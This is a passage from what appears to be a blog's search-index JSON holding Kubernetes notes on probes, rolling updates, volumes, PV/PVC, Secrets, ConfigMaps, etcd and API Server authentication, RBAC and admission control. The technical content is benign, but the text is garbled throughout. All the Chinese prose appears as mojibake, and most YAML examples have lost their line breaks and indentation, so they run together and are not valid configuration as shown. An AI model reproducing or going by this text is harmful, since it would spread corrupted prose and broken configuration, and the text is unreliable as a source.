è¿™ä¸‰ç§ Pod éƒ½æ”¯æŒä¸‰ç§æ£€æµ‹æ–¹æ³•ï¼šæ‰§è¡Œå‘½ä»¤ã€æ¢æµ‹ TCP ç«¯å£ä»¥åŠå‘é€ HTTP GET è¯·æ±‚ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:4:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"æ‰©å®¹åº”ç”¨æ£€æŸ¥ ä¸€ä¸ªå…¸å‹çš„ä½¿ç”¨åœºæ™¯å°±æ˜¯åœ¨æ‰©å®¹åº”ç”¨æ—¶ï¼Œæ£€æŸ¥æ–°å¢åŠ çš„ Pod æ˜¯å¦èƒ½æ­£å¸¸å·¥ä½œã€‚ä¾‹å¦‚å¯¹äºä¸€ä¸ª Web æœåŠ¡ï¼Œå¯ä»¥è¿™æ ·å†™æ¢æµ‹å™¨ï¼š readinessProbe:httpGet:scheme:HTTPpath:/healthyport:8080initialDelaySeconds:10periodSeconds:5 æ­¤æ—¶ Kubernetes ä¼šåˆ¤æ–­è¿”å›çš„çŠ¶æ€ç æ˜¯å¦åœ¨ 200 - 400 ä¹‹é—´ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:4:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"æ»šåŠ¨æ›´æ–°æ£€æŸ¥ å¦ä¸€ä¸ªæ›´å®ç”¨çš„åœºæ™¯æ˜¯åœ¨æ»šåŠ¨æ›´æ–°æ—¶ï¼Œç¡®ä¿æ–°ä¸Šçº¿çš„ Pod èƒ½æ­£å¸¸å·¥ä½œï¼Œé¿å…æ›´æ–°åå…¨çº¿å®•æœºä¸å¾—ä¸å›æ»šçš„çŠ¶å†µã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œæ»šåŠ¨æ›´æ–°è¿‡ç¨‹ä¸­ä¼šé€æ­¥å¢åŠ æ–°çš„ Podï¼Œåˆ é™¤æ—§çš„ Podã€‚maxSurge å’Œ maxUnavailable åˆ†åˆ«æ˜¯å¯¹è¿™ä¸¤ä¸ªè¿‡ç¨‹çš„é‡åŒ–ã€‚ maxSurge æ§åˆ¶ å‰¯æœ¬æ€»æ•° - é¢„æœŸå‰¯æœ¬æ•° çš„æœ€å¤§å€¼ å¯ä»¥ä¸ºå…·ä½“æ•°å­— é»˜è®¤ä¸º é¢„æœŸå‰¯æœ¬æ•° çš„ 25% å‘ä¸Šå–æ•´ ç¡®ä¿ä¸ä¼šå¢åŠ å¤ªå¤šæ–° Pod maxUnavailable æ§åˆ¶ ä¸å¯ç”¨å‰¯æœ¬æ•° çš„æœ€å¤§å€¼ å¯ä»¥ä¸ºå…·ä½“æ•°å­— é»˜è®¤ä¸º é¢„æœŸå‰¯æœ¬æ•° çš„ 25% å‘ä¸‹å–æ•´ ç¡®ä¿ä¸ä¼šåˆ é™¤å¤ªå¤šæ—§ Pod è¿™é‡Œçš„ Unavailableï¼Œä¾¿æ˜¯é€šè¿‡ readinessProbe æ¥æ¢æµ‹çš„ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ Deployment çš„ .spec ä¸‹æ·»åŠ å†…å®¹æ¥è‡ªå®šä¹‰è¿™ä¸¤ä¸ªå€¼ï¼š strategy:rollingUpdate:maxSurge:30%maxUnavailable:30% ","date":"2021-10-10","objectID":"/kubernetes/:4:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Volume å’Œ Docker ä¸­çš„ Volume ç±»ä¼¼ï¼Œç”¨äºæä¾›æŒä¹…åŒ–å­˜å‚¨ã€‚åŒä¸€ä¸ª Pod ä¸­æ‰€æœ‰å®¹å™¨éƒ½å¯ä»¥è®¿é—® Mount åˆ°è¿™ä¸ª Pod ä¸Šçš„ Volumeã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:5:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"emptyDir Volume è¿™ç§ Volume åœ¨ Pod è¢«åˆ é™¤æ—¶ä¹Ÿä¼šè¢«åˆ é™¤ï¼Œä¸è¿‡ä¸å—å®¹å™¨è¢«åˆ é™¤çš„å½±å“ã€‚ apiVersion:v1kind:Podmetadata:name:producer-consumerspec:containers:- name:producerimage:busyboxvolumeMounts:- mountPath:/producer_dirname:shared-volumeargs:- /bin/sh- -c- echo \"hello\" \u003e /producer_dir/hello; sleep 30000- name:consumerimage:busyboxvolumeMounts:- mountPath:/consumer_dirname:shared-volumeargs:- /bin/sh- -c- cat /consumer_dir/hello; sleep 30000volumes:- name:shared-volumeemptyDir:{} ä¸Šè¿° yaml ä¼šåˆ›å»ºä¸€ä¸ªå« producer å’Œ consumer ä¸¤ä¸ªå®¹å™¨çš„ Podï¼Œå‰è€…å‘ shared-volume ä¹Ÿå°±æ˜¯å®¹å™¨å†…çš„ /producer_dir å†™æ•°æ®ï¼Œåè€…ä» shared-volume ä¹Ÿå°±æ˜¯å®¹å™¨å†…çš„ /consumer_dir è¯»æ•°æ®ï¼Œæœ€ç»ˆå¯ä»¥é€šè¿‡ k logs producer-consumer consumer æŸ¥çœ‹è¯»å–åˆ°çš„æ•°æ®ã€‚ è¿™ç§ Volume ç”±äºåœ¨ Pod è¢«åˆ é™¤åå°±ä¼šæ¶ˆå¤±ï¼Œæ¯”è¾ƒé€‚åˆåœ¨å®¹å™¨é—´ä¸´æ—¶å…±äº«å­˜å‚¨ã€‚ä½†åœ¨åˆ›å»ºæ—¶å»ºè®®è®¾ç½® sizeLimit é˜²æ­¢å ç”¨ç©ºé—´è¿‡å¤§ã€‚å¯ä»¥è®¤ä¸ºï¼ŒemptyDir æ˜¯ä¸€ç§ä¸èƒ½æŒ‡å®š path å’Œ type çš„ hostPathã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:5:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"hostPath Volume è¿™ä¸ªä¹Ÿæ¯”è¾ƒå¥½ç†è§£ï¼Œå°±æ˜¯æŠŠå®¹å™¨æ‰€å¤„çš„å®¿ä¸»æœº host ä¸Šçš„æŸä¸ª path ä½œä¸º Volume è¿›è¡ŒæŒ‚è½½ï¼Œå¥½å¤„æ˜¯ç›®å½•å¹¶ä¸ä¼šå—åˆ° Pod åˆ é™¤çš„å½±å“ï¼Œå¹¶ä¸”èƒ½å¤Ÿæ›´æ–¹ä¾¿åœ°è®¿é—®å®¿ä¸»æœºä¸Šçš„æ–‡ä»¶â€”â€”è¿™ä¹Ÿæ˜¯è¿™ç§æ–¹å¼çš„åå¤„ï¼Œå³å¢åŠ äº† Pod å’Œ Node çš„è€¦åˆåº¦ã€‚è¯­æ³•ä¸€èˆ¬å¦‚ä¸‹ï¼š volumes:- hostPath:path:/etc/ssl/certstype:DirectoryOrCreatename:ca-certs å¯ä»¥æƒ³åˆ°ï¼Œå¦‚æœ Pod è¢«è°ƒåº¦åˆ°äº†å…¶ä»– Node ä¸Šï¼Œé‚£ä¹ˆ hostPath å¾ˆå¯èƒ½å°±å¤±æ•ˆäº†ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:5:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å¤–éƒ¨å­˜å‚¨ å¦‚æœéœ€è¦æŒä¹…åŒ–çš„å­˜å‚¨ï¼Œå¯ä»¥ä½¿ç”¨å„ç§å¤–éƒ¨å­˜å‚¨ä¾‹å¦‚ AWSã€GCPã€Azure æä¾›çš„å­˜å‚¨æœåŠ¡ï¼Œæˆ–æ˜¯ä½¿ç”¨ Ceph ç­‰åˆ†å¸ƒå¼å­˜å‚¨ï¼Œè¯­æ³•å„ä¸ç›¸åŒï¼Œå¯ä»¥å‚è€ƒå¯¹åº”çš„æ–‡æ¡£ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:5:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"PV å’Œ PVC PersistentVolume ä¹Ÿæ˜¯æŒä¹…åŒ–çš„å­˜å‚¨ï¼Œé€šè¿‡ PersistentVolumeClaim æ¥ç”³è¯·ï¼ŒKubernetes ä¼šæ ¹æ®æ¡ä»¶åˆ†é…é€‚åˆçš„ PVã€‚è¿™å®é™…ä¸Šå°±æ˜¯å¯¹ Volume ä½œäº†ä¸€å±‚å°è£…ï¼Œä½¿å¾—ç”¨æˆ·ä¸éœ€è¦å…³å¿ƒæ‰€è·å¾—çš„å­˜å‚¨ç©ºé—´çš„åº•å±‚ä¿¡æ¯ã€‚ åˆ›å»º PVï¼š apiVersion:v1kind:PersistentVolumemetadata:name:pv1spec:capacity:storage:1GiaccessModes:- ReadWriteOnce # mount to a single nodepersistentVolumeReclaimPolicy:RecyclestorageClassName:nfs# like label selectornfs:path:/nfs/pv1server:1.1.1.1# nfs server å…¶ä¸­ accessModes æŒ‡å®šäº†è®¿é—®æ¨¡å¼ä¸ºå¯è¯»å†™ä¸”åªèƒ½æŒ‚è½½åˆ°å•ä¸ª Node ä¸Šï¼Œå¯¹åº”çš„è¿˜æœ‰ ReadOnlyManyã€ReadWriteMany ç­‰æ¨¡å¼ã€‚persistentVolumeReclaimPolicy æŒ‡å®šäº†å›æ”¶æœºåˆ¶ï¼ŒRetain éœ€è¦æ‰‹å·¥å›æ”¶ï¼ŒRecycle ä¼šæ¸…é™¤ PV ä¸­æ‰€æœ‰æ•°æ®ï¼Œè€Œ Delete åˆ™ä¼šåˆ é™¤å¤–éƒ¨å­˜å‚¨ï¼ˆä¸€èˆ¬æ˜¯äº‘å¹³å°ï¼‰ä¸­çš„å­˜å‚¨èµ„æºæœ¬èº«ã€‚ ç„¶ååˆ›å»º PVCï¼Œè¿‡ç¨‹ç±»ä¼¼ï¼š apiVersion:v1kind:PersistentVolumeClaimmetadata:name:pvc1spec:accessModes:- ReadWriteOnceresources:requests:storage:1GistorageClassName:nfs æˆåŠŸåˆ›å»ºåï¼Œpv1 å’Œ pvc1 çš„çŠ¶æ€ä¼šå˜ä¸º BOUNDã€‚ä¹‹åå¦‚æœéœ€è¦åœ¨ Pod ä¸­ä½¿ç”¨å­˜å‚¨ï¼Œåªéœ€è¦ä¿®æ”¹ .spec.volumes å¦‚ä¸‹ï¼š volumes:- name:datapersistentVolumeClaim:claimName:pvc1 ä½¿ç”¨å®Œæ¯•åï¼Œç”¨ k delete pvc pvc1 åˆ é™¤ PVC æ¥å›æ”¶ PVï¼Œæ­¤æ—¶ PV çŠ¶æ€ä¼šå˜æˆ Releasedï¼Œéšå Kubernetes ä¼šå¯åŠ¨ä¸€ä¸ª recycler Pod è¿›è¡Œå†…å®¹æ¸…é™¤å·¥ä½œå¹¶å°† PV çŠ¶æ€é‡æ–°è®¾ä¸º Availableã€‚å¦‚æœæ˜¯ Retain æ¨¡å¼åˆ™ä¸ä¼šå¯åŠ¨ recyclerï¼ŒPV å§‹ç»ˆå¤„äºä¸å¯ç”¨çš„ Released çŠ¶æ€ï¼Œä½†å³ä½¿æ­¤æ—¶åˆ é™¤ PV å¹¶é‡æ–°åˆ›å»ºï¼ŒPV ä¸­çš„æ•°æ®ä¹Ÿä¾ç„¶å­˜åœ¨ã€‚ æ­¤å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å¤–éƒ¨çš„ StorageClass ä»¥å®ç° PV çš„åŠ¨æ€ä¾›ç»™ï¼Œæ­¤æ—¶åˆ›å»º PVC æ—¶å¦‚æœªæ‰¾åˆ°åˆé€‚çš„ PV å°±ä¼šè‡ªåŠ¨åˆ›å»ºã€‚ è¦å®ç°åŠ¨æ€ä¾›ç»™ï¼Œåœ¨ PVC çš„ .spec.storageClassName ä¸­æŒ‡å®š StorageClass çš„ .metadata.name å³å¯ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:5:4","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"é…ç½®ç®¡ç† ","date":"2021-10-10","objectID":"/kubernetes/:6:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"Secret è¯´åˆ°é…ç½®ç®¡ç†ï¼Œé¦–å…ˆä¸å¾—ä¸æçš„å°±æ˜¯å¦‚ä½•ç®¡ç†é…ç½®ä¸­çš„æ•æ„Ÿä¿¡æ¯ã€‚åœ¨ GitHub ä¸­è¿™æ˜¯é€šè¿‡ Repo çš„ Secrets æ¥ç®¡ç†çš„ï¼ŒKubernetes ä¸­ä¹ŸåŒç†ï¼Œé€šè¿‡ Secret ç®¡ç†ã€‚Secret å¯ä»¥ä½œä¸ºä¸€ç§ç‰¹æ®Šçš„ Volume å¹¶æŒ‚è½½åˆ° Pod ä¸Šä¾›è¯»å–ã€‚ é¦–å…ˆåˆ›å»º Secretï¼š apiVersion:v1kind:Secretmetadata:name:secretdata:username:YWRtaW4=password:MTIzNDU2 éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒSecret çš„ key-value ä¸­ value å¿…é¡»ç»è¿‡ Base64 ç¼–ç ã€‚ åˆ›å»ºåå°±å¯ä»¥ç”¨ k get secret å’Œ k describe secret æŸ¥çœ‹äº†ã€‚ ä¹‹ååˆ›å»ºå¯¹åº”çš„ Volumeï¼Œå°±å¯ä»¥æŒ‚è½½åˆ° Pod äº†ï¼š apiVersion:v1kind:Podmetadata:name:secret-podspec:containers:- name:secret-containerimage:busyboxvolumeMounts:- name:secret-volumemountPath:/etc/secretreadOnly:trueargs:- /bin/sh- -c- sleep 10; touch /tmp/healthy; sleep 30000volumes:- name:secret-volumesecret:secretName:secret ä¹‹å k exec -it secret-pod -- sh å¹¶ ls /etc/secret å°±å¯ä»¥çœ‹åˆ°æ¯ä¸ª key éƒ½æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œå†…å®¹å°±æ˜¯ Base64 è§£ç åçš„ valueã€‚å½“ Secret æœ¬èº«æ›´æ–°æ—¶ï¼Œæ–‡ä»¶çš„å†…å®¹ä¹Ÿä¼šè‡ªåŠ¨æ›´æ–°ã€‚ å¦ä¸€ç§æ–¹æ³•æ˜¯ç”¨ Secret é…ç½®ç¯å¢ƒå˜é‡ï¼Œåªéœ€è¦åœ¨ .spec.containers[i] ä¸‹æ·»åŠ ï¼š env:- name:USERNAMEvalueFrom:secretKeyRef:name:secretkey:username è¿™ç§æ–¹å¼æ›´ä¸ºæ–¹ä¾¿ï¼Œä½†æ˜¯ä¸æ”¯æŒåŒæ­¥æ›´æ–° Secretã€‚ è€Œå¯¹äºå‰©ä½™çš„ä¸é‚£ä¹ˆæ•æ„Ÿçš„ä¿¡æ¯ï¼Œå°±ä¸éœ€è¦ä½¿ç”¨ Secret äº†ï¼Œè€Œæ˜¯ä½¿ç”¨ ConfigMap æ¥é…ç½®ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:6:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"ConfigMap ConfigMap ä¸ Secret çš„ YAML æ ¼å¼éå¸¸ç›¸ä¼¼ï¼ŒåŒºåˆ«åœ¨äºï¼š æ•°æ®ä¸éœ€è¦ Base64 ç¼–ç  .kind æ”¹ä¸º ConfigMap é€šè¿‡ Volume æŒ‚è½½ä¸é…ç½®ç¯å¢ƒå˜é‡çš„è¿‡ç¨‹ä¹Ÿå®Œå…¨ä¸€è‡´ï¼š volumes:- name:configmap-volumeconfigMap:name:configmap env:- name:USERNAMEvalueFrom:configMapKeyRef:name:configmapkey:username ","date":"2021-10-10","objectID":"/kubernetes/:6:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"etcd etcd é€šè¿‡ key-value å¯¹å­˜å‚¨æ¥è‡ª API Server çš„æ•°æ®ï¼Œå…¶æœ€é‡è¦çš„ç‰¹æ€§æ˜¯å¯ä»¥ç›‘æµ‹æ•°æ®çš„å˜æ›´ï¼Œå› æ­¤å¯ä»¥å½“æˆæ¶ˆæ¯é˜Ÿåˆ—æ¥ç”¨ã€‚etcd ä¹Ÿå¯ä»¥ç”¨äºæœåŠ¡å‘ç°å’Œé…ç½®å…±äº«ï¼Œå…¶ä¸­ key åœ¨ç»è¿‡ä¸€æ®µæ—¶é—´ï¼ˆTTLï¼‰åå¯èƒ½å¤±æ•ˆï¼Œå› æ­¤å­˜åœ¨å¯¹åº”çš„ç»­çº¦æœºåˆ¶ï¼Œè€Œè¿™ç§æœºåˆ¶æ°å¥½å¯ä»¥ä½œä¸ºæœåŠ¡å‘ç°ä¸­çš„å¿ƒè·³æ¥ä½¿ç”¨ã€‚ ä¸ºä¿éšœæ•°æ®ä¸€è‡´æ€§ï¼Œetcd é‡‡ç”¨äº† Raft åè®®ã€‚Raft åè®®éµå¾ª quorum æœºåˆ¶ï¼Œä¹Ÿå°±æ˜¯å¤šæ•°åŒæ„çš„è§„åˆ™ï¼Œå…·ä½“åŸç†åœ¨ The secret lives of data ä¸Šæœ‰éå¸¸ç”ŸåŠ¨çš„è§£é‡Šã€‚ åœ¨ 4.2.1 ç‰ˆæœ¬ä¸­å¼•å…¥äº†æ–°è§’è‰² Learnerï¼Œä½¿å¾—æ–°èŠ‚ç‚¹åŠ å…¥æ—¶åªæ¥æ”¶æ•°æ®è€Œä¸æŠ•ç¥¨ï¼Œå› æ­¤ä¸å½±å“ quorumï¼Œé˜²æ­¢è¿‡åº¦æ¶ˆè€— Leader å¸¦å®½ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:7:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å®‰è£… åœ¨ Release é¡µé¢ æœ‰è¯¦å°½ä¸”ç¨³å®šçš„å®‰è£…æ­¥éª¤ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:7:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å¯åŠ¨ ä¸ºäº†é˜²æ­¢å’Œ k8s çš„ etcd å®¹å™¨ç«¯å£å†²çªï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹åŠ¨æŒ‡å®šç›‘å¬ç«¯å£ã€‚å…¶ä¸­ listen-client-urls å’Œ listen-peer-urls æ˜¯ etcd æœåŠ¡å™¨ç›‘å¬å®¢æˆ·ç«¯å’Œå…¶ä»–æœåŠ¡å™¨è¯·æ±‚çš„åœ°å€ï¼Œè€Œ advertise-client-urls å’Œ initial-advertise-peer-urls æ˜¯ etcd å®¢æˆ·ç«¯å’Œå…¶ä»–æœåŠ¡å™¨å‘ etcd æœåŠ¡å™¨å‘èµ·è¯·æ±‚æ‰€ä½¿ç”¨çš„ç«¯å£ã€‚ $ etcd --initial-cluster \"default=http://localhost:12380\" \\ --listen-client-urls \"http://localhost:12379\" \\ --listen-peer-urls \"http://localhost:12380\" \\ --advertise-client-urls \"http://localhost:12379\" \\ --initial-advertise-peer-urls \"http://localhost:12380\" ","date":"2021-10-10","objectID":"/kubernetes/:7:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å¸¸ç”¨æ“ä½œ # list all members in table etcdctl --endpoints=localhost:12379 member list --write-out=table # put data etcdctl --endpoints=localhost:12379 put /a b etcdctl --endpoints=localhost:12379 put /c d # read keys and values in / etcdctl --endpoints=localhost:12379 get --prefix / # read keys in / etcdctl --endpoints=localhost:12379 get --prefix / --keys-only # watch changes in / etcdctl --endpoints=localhost:12379 watch --prefix / # put new data in /a etcdctl --endpoints=localhost:12379 put /a e # get old data etcdctl --endpoints=localhost:12379 get /a --rev=2 è¿™é‡ŒæŸ¥è¯¢å†å²ç‰ˆæœ¬çš„åŸç†æ¶‰åŠåˆ° etcd åº•å±‚çš„å­˜å‚¨æœºåˆ¶ã€‚etcd é‡‡ç”¨ kvindex ä½œå†…å­˜ç´¢å¼•ï¼Œboltdb è¿›è¡Œå­˜å‚¨ã€‚å…¶ä¸­ kvindex çš„ key å­˜å‚¨å®é™…æ•°æ®çš„ keyï¼Œè€Œ value åˆ™å­˜å‚¨ revision ä¿¡æ¯ã€‚è€Œ boltdb ä¸­ key å­˜å‚¨çš„æ˜¯ revision ä¿¡æ¯ï¼Œè€Œ value åˆ™æ˜¯å®é™…æ•°æ®çš„ key-value å¯¹ã€‚è¿™æ ·å¯¹æ•°æ®çš„è¯»å†™å°±éµå¾ª key-\u003ekvindex-\u003eboltdb-\u003evalue çš„è·¯å¾„æ“ä½œæŒ‡å®šç‰ˆæœ¬çš„æ•°æ®ã€‚ Kubernetes å„ç§ API Resources ä¸­çš„ resourceVersion çš„å€¼å°±æ¥è‡ªäº etcd çš„ revision ä¿¡æ¯ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:7:3","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"ç¾å¤‡ # backup etcdctl --endpoints=localhost:12379 snapshot save snapshot.db # restore etcdctl --endpoints=localhost:12379 snapshot restore snapshot.db # --initial-cluster=... ","date":"2021-10-10","objectID":"/kubernetes/:7:4","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"ğŸŒ°ï¼šå¯åŠ¨ä¸‰èŠ‚ç‚¹ HTTPS é›†ç¾¤ # each etcd instance name need to be unique # x380 is for peer communication # x379 is for client communication # dir-data cannot be shared nohup etcd \\ --name infra0 \\ --data-dir=/tmp/etcd/infra0 \\ --listen-peer-urls https://127.0.0.1:3380 \\ --initial-advertise-peer-urls https://127.0.0.1:3380 \\ --listen-client-urls https://127.0.0.1:3379 \\ --advertise-client-urls https://127.0.0.1:3379 \\ --initial-cluster-token etcd-cluster-1 \\ --initial-cluster infra0=https://127.0.0.1:3380,infra1=https://127.0.0.1:4380,infra2=https://127.0.0.1:5380 \\ --initial-cluster-state new \\ --client-cert-auth --trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem \\ --peer-client-cert-auth --peer-trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --peer-cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --peer-key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem 2\u003e\u00261 \u003e /var/log/infra0.log \u0026 nohup etcd \\ --name infra1 \\ --data-dir=/tmp/etcd/infra1 \\ --listen-peer-urls https://127.0.0.1:4380 \\ --initial-advertise-peer-urls https://127.0.0.1:4380 \\ --listen-client-urls https://127.0.0.1:4379 \\ --advertise-client-urls https://127.0.0.1:4379 \\ --initial-cluster-token etcd-cluster-1 \\ --initial-cluster infra0=https://127.0.0.1:3380,infra1=https://127.0.0.1:4380,infra2=https://127.0.0.1:5380 \\ --initial-cluster-state new \\ --client-cert-auth --trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem \\ --peer-client-cert-auth --peer-trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --peer-cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --peer-key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem 2\u003e\u00261 \u003e /var/log/infra1.log \u0026 nohup etcd \\ --name infra2 \\ --data-dir=/tmp/etcd/infra2 \\ --listen-peer-urls https://127.0.0.1:5380 \\ --initial-advertise-peer-urls https://127.0.0.1:5380 \\ --listen-client-urls https://127.0.0.1:5379 \\ --advertise-client-urls https://127.0.0.1:5379 \\ --initial-cluster-token etcd-cluster-1 \\ --initial-cluster infra0=https://127.0.0.1:3380,infra1=https://127.0.0.1:4380,infra2=https://127.0.0.1:5380 \\ --initial-cluster-state new \\ --client-cert-auth --trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem \\ --peer-client-cert-auth --peer-trusted-ca-file=/tmp/etcd-certs/certs/ca.pem \\ --peer-cert-file=/tmp/etcd-certs/certs/127.0.0.1.pem \\ --peer-key-file=/tmp/etcd-certs/certs/127.0.0.1-key.pem 2\u003e\u00261 \u003e /var/log/infra2.log \u0026 ","date":"2021-10-10","objectID":"/kubernetes/:7:5","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"API Server ä»»ä½•è¯·æ±‚åˆ°è¾¾ API Server åé¦–å…ˆéƒ½å¿…é¡»ç»è¿‡è®¤è¯ã€é‰´æƒã€å‡†å…¥æ§åˆ¶ã€é™æµç­‰é˜¶æ®µï¼Œä¹‹åæ‰ä¼šè¢«æ¥å—ã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:8:0","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"è®¤è¯ Kubernetes æ”¯æŒå¤šç§è®¤è¯æ–¹å¼ï¼š è¯ä¹¦ï¼ˆ--client-ca-fileï¼‰ é™æ€ tokenï¼ˆ--token-auth-fileï¼Œcsv æ–‡ä»¶ï¼‰ Bootstrap Tokenï¼ˆkube-system ä¸­çš„ Secretï¼‰ é™æ€å£ä»¤ï¼ˆ--basic-auth-fileï¼Œcsv æ–‡ä»¶ï¼‰ ServiceAccount OpenIDï¼ˆOAuth 2.0ï¼‰ Webhookï¼ˆ--authtication-token-webhook-config-fileï¼‰ åŒ¿åè®¿é—®ï¼ˆ--anonymous-authï¼‰ å…¶ä¸­ Webhook éœ€è¦ç”¨æˆ·è‡ªå·±ç¼–å†™è®¤è¯æœåŠ¡ï¼Œä½¿ç”¨ TokenReview è¿›è¡Œè®¤è¯å’Œè¿”å›ç»“æœã€‚ ","date":"2021-10-10","objectID":"/kubernetes/:8:1","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"é‰´æƒ Kubernetes æ”¯æŒçš„é‰´æƒæ–¹å¼åŒ…æ‹¬ï¼š ABACï¼ˆä¸æ¨èï¼‰ RBAC Webhook Node ä¾‹å¦‚ï¼Œè¦ä½¿ç”¨ RBACï¼Œé¦–å…ˆè¦åˆ›å»ºç›¸åº”çš„è§’è‰²ï¼Œå¦‚ Role å’Œè·¨ Namespace çš„ ClusterRoleï¼š apiVersion:rbac.authorization.k8s.io/v1kind:Rolemetadata:namespace:defaultname:pod-readerrules:- apiGroups:[\"\"]resources:[\"pods\"]verbs:[\"get\",\"watch\",\"list\"] apiVersion:rbac.authorization.k8s.io/v1kind:ClusterRolemetadata:name:secret-readerrules:- apiGroups:[\"\"]resources:[\"secrets\"]verbs:[\"get\",\"watch\",\"list\"] éšåï¼Œé€šè¿‡ RoleBindingï¼ˆæˆ– ClusterRoleBindingï¼‰ å°† Role ç»‘å®šåˆ°å…·ä½“çš„ subjectï¼ˆç”¨æˆ·ã€ç»„ã€ServiceAccount ç­‰ï¼‰ ä¸Šï¼š apiVersion:rbac.authorization.k8s.io/v1kind:RoleBindingmetadata:namespace:dev# only grant perm in dev namespacename:read-secretssubjects:- kind:Username:daveapiGroup:rbac.authorization.k8s.ioroleRef:kind:ClusterRolename:secret-readerapiGroup:rbac.authorization.k8s.io ","date":"2021-10-10","objectID":"/kubernetes/:8:2","tags":["Kubernetes"],"title":"ä¹˜é£ç ´æµªï¼šKubernetes ç¬”è®°","uri":"/kubernetes/"},{"categories":["äº‘"],"content":"å‡†å…¥ å‡†å…¥æ§åˆ¶åœ¨æˆæƒåå¯¹è¯·æ±‚è¿›ä¸€æ­¥éªŒè¯ï¼Œç²’åº¦æ›´ç»†ã€‚å‡†å…¥æ§åˆ¶ç”±å¤šä¸ªæ’ä»¶å…±åŒå†³å®šï¼Œé€šè¿‡äº†æ‰€æœ‰æ’ä»¶çš„æ£€æŸ¥ï¼Œè¯·æ±‚æ‰ä¼šæœ€ç»ˆè¢«æ¥å—ã€‚å¸¸è§çš„æ’ä»¶åŒ…æ‹¬ï¼š AlwaysAdmit æ¥å—ä»»æ„è¯·æ±‚ AlwaysPullImages æ€»æ˜¯æ‹‰å–æœ€æ–°é•œåƒï¼Œæ— è®ºæœ¬åœ°æ˜¯å¦å·²å­˜åœ¨ SecurityContextDeny æ‹’ç»åŒ…å«éæ³• SecurityContext çš„è¯·æ±‚ ResourceQuota ç”¨æ¥é™åˆ¶ Pod è¯·æ±‚çš„é…é¢ DefaultStorageClass ä¸º PVC 